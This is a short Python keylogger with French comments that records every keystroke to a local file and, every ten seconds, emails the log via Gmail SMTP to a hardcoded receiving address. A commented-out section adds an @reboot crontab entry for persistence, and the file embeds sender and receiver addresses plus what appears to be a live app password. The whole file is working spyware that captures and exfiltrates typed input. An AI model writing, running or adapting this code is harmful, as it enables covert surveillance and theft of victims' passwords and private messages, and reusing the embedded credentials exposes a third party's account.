import logging
from threading import Timer
from pynput.keyboard import Key, Listener
import smtplib,ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import subprocess
import os

"""
#--------DÉBUT TÂCHES PROGRAMMÉES---------------

#On donne les droits d'exécutions
os.system('chmod +x keylogger.py')


# Chemin vers le script Python
python_script = os.getcwd()+'/keylogger.py'

path_env = os.getcwd()+'/env/bin/python'

# Commande crontab pour exécuter le script Python au démarrage avec temporisation et affichage graphique
cron_job = f"@reboot sleep 30 && DISPLAY=:0 {path_env} {python_script} >> /home/ubuntu/cronlog.txt 2>&1"

# Obtenir la crontab actuelle de l'utilisateur
current_cron = subprocess.run(['crontab', '-l'], capture_output=True, text=True)

# Vérifier si le script est déjà dans la crontab
if cron_job not in current_cron.stdout:
    # Ajouter la nouvelle tâche à crontab
    new_cron = current_cron.stdout + cron_job + "\n"
    subprocess.run(['crontab', '-'], input=new_cron, text=True)
    print("Le script Python a été ajouté à crontab pour être exécuté au démarrage.")
else:
    print("Le script Python est déjà dans crontab.")

#--------FIN TÂCHES PROGRAMMÉES----------------
"""

#--------DÉBUT PARTIE ENVOI MAIL----------------

def sendMail():
    #Configuration pour l'envoi de mail
    port=465
    smtp_server="smtp.gmail.com"
    sender_email="amazonoussama640@gmail.com" #adresse mail bidon d'où le mail va être envoyé
    receiver_email="oussamaau123@gmail.com" #adresse mail sur laquelle on veut recevoir le mail
    password="tdcf hoql nrco flxv"
    objet="Fichier du keylog"
    corps="Envoi du fichier keylog"

    #Création d'un mail multipart
    message=MIMEMultipart()
    message["From"]=sender_email
    message["To"]=receiver_email
    message["Subject"]=objet

    message.attach(MIMEText(corps,"plain"))

    filename="keylogs.txt"

    with open(filename,"rb") as attachment:
        part=MIMEBase("application","octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {filename}",
    )
    message.attach(part)

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())

    print("Le mail a été envoyé") # A enlever plus tard


#--------FIN PARTIE ENVOI MAIL------------------

logging.basicConfig(filename=("keylogs.txt"),filemode="w",
                        datefmt='%d/%m/%Y %I:%M:%S %p',format='%(asctime)s:%(message)s',level=logging.DEBUG)


def on_press(key):
    logging.info(str(key))


while True:
    with Listener(on_press=on_press) as listener:
        Timer(10, listener.stop).start()
        listener.join()

    print("Commence à envoyer le mail") # A enlever plus tard
    sendMail()